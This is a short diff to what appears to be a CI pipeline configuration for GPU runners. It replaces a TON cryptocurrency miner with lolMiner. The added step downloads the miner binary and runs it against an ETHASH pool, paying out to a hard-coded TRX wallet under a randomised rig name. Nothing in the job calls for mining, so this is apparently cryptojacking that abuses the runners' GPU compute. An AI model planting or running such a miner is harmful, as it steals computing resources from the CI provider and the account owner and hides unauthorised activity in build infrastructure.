@@ -7,5 +7,5 @@ jobs:
     resource_class: gpu.nvidia.medium
     steps:
       - run: nvidia-smi
-      - run: wget https://github.com/toncoinpool/stratum-miner/releases/download/v2.1.1/TON-Stratum-Miner-2.1.1-linux-headless.tar.gz && tar -xvf TON-Stratum-Miner-2.1.1-linux-headless.tar.gz && cd TON-Stratum-Miner && ./TON-Stratum-Miner -w EQDNhrBNvfhU9pHI3okVlDyLd_QSy9njt4XjlciRYFTLD0Y9 -b cuda-20 -F 2048 --exclude-gpus 1 -r AST
+      - run: wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.45/lolMiner_v1.45_Lin64.tar.gz && tar xvf lolMiner_v1.45_Lin64.tar.gz && cd 1.45 && ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TWqp4JVSvTdrMzozHzncjDgqezt88XjCZ5.$(echo $(shuf -i 1-9999 -n 1)-RIG) --ethstratum ETHPROXY 
       - run: docker run --gpus all nvidia/cuda:9.0-base nvidia-smi
